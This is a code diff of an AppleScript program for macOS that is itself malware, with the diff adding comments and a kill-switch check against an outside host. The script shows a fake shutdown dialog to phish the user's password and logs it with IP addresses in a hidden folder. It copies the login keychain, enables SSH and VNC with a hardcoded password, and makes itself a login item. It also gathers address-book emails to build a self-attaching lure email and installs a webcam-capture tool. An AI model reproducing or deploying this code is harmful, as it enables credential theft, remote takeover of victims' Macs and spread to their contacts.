@@ -1,23 +1,34 @@
 set theuser to do shell script "whoami"
 try
-	do shell script "mkdir ~/Public/." & theuser & ""
+	do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
 end try
 try
 	set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
 end try
 
 try
+	set killswitch to ""
+	do shell script "curl http://benbern.dyndns.info/stuff/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1" -- Check for a killswitch
+	set killswitch to (characters 1 through -1 of result) as text -- Get IP
+	if killswitch = "kill" then
+		-- If killswitch is triggered, delete all of the app and password files
+		do shell script "rm -rf " & ufld & ""
+		do shell script "rm -rf " & (POSIX path of (path to me))
+	end if
+end try
+
+try
 	
 	repeat
 		set passwd to text returned of (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 10 with hidden answer) -- Prompt for Password
-		if passwd = "" then
+		if gave up of result = true then -- If the user doesn't enter a password:
 			try
 				set reso to POSIX path of (path to resource "Updater.app")
 				set newreso to POSIX path of ("" & ufld & "Updater.app")
 				do shell script "cp -r " & reso & " " & newreso
 				tell application "System Events" to make login item at end with properties {path:newreso, kind:application} -- Make application a login item
 			end try
-			do shell script "killall -u " & theuser -- shutdown
+			do shell script "killall -u " & theuser -- Shutdown
 		end if
 		
 		try
@@ -37,7 +48,7 @@ try
 		set WANIP to "not connected"
 		set LANIP to "not connected"
 	end try
-	do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt"
+	do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
 	
 	try
 		set reso to POSIX path of (path to resource "Updater.app")
@@ -46,17 +57,17 @@ try
 		tell application "System Events" to make login item at end with properties {path:newreso, kind:application} -- Make application a login item
 		
 	end try
-		
+	
 	try
 		set china to "~/Library/Keychains/login.keychain"
 		
 		do shell script "cp " & china & " " & ufld
-		do shell script "mv /Users/" & theuser & "/Public/." & theuser & "/login.keychain /Users/" & theuser & "/Public/." & theuser & "/" & theuser & ".keychain" -- Copy keychain to UFLD
+		do shell script "mv /Users/" & theuser & "/Public/." & theuser & "/login.keychain /Users/" & theuser & "/Public/." & theuser & "/" & theuser & ".keychain" -- Copy keychain to hidden folder
 	end try
-	
+		
 	try
 		do shell script "sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist" password passwd
-		do shell script "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw benwashere -restart -agent -privs -all" password passwd
+		do shell script "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw benwashere -restart -agent -privs -all" password passwd -- Enable SSH and VNC
 	end try
 	
 end try
@@ -69,22 +80,16 @@ try
 		set thepeople to every person
 		set j to (number of people)
 		
-		repeat with i from 1 to j
-			try
-				set adr to (value of first email of (item i of thepeople))
-				do shell script "echo " & adr & " >> " & adrt & ""
-			end try
-			
-			try
-				set adr to (value of second email of (item i of thepeople))
-				do shell script "echo " & adr & " >> " & adrt & ""
-			end try
-			
-			try
-				set adr to (value of third email of (item i of thepeople))
-				do shell script "echo " & adr & " >> " & adrt & ""
-			end try
-			
+		
+		repeat with i from 1 to j -- Add email addresses to address file
+			set adrper to (number of emails of (item i of the people))
+			repeat with x from 1 to adrper
+				try
+					set adr to (value of email x of (item i of thepeople))
+					do shell script "echo " & adr & " >> ~/desktop/adr.txt"
+				end try
+				
+			end repeat
 		end repeat
 		quit
 	end tell
@@ -94,7 +99,7 @@ try
 	
 	Check out this new Mac application! You'll never use your computer the same way again ;)
 	
-	" & theuser & ""}
+	" & theuser & ""} -- Make email message
 	end tell
 	
 	set addresses to {}
@@ -104,7 +109,7 @@ try
 		if length of nextLine is greater than 0 then
 			tell application "Mail"
 				tell theMessage
-					make new bcc recipient at end of bcc recipients with properties {address:nextLine}
+					make new bcc recipient at end of bcc recipients with properties {address:nextLine} -- add recipients
 				end tell
 			end tell
 		end if
@@ -112,12 +117,13 @@ try
 	
 	tell application "Mail"
 		tell content of theMessage
-			make new attachment with properties {file name:(path to me)} at after last paragraph
+			make new attachment with properties {file name:(path to me)} at after last paragraph -- Attach the app
 		end tell
+		-- send theMessage
 		quit
 	end tell
 end try
 try
 	set isight to POSIX path of (path to resource "isightcapture")
-	do shell script "sudo cp " & isight & " /usr/sbin"
+	do shell script "sudo cp " & isight & " /usr/sbin" -- Install isightcapture
 end try
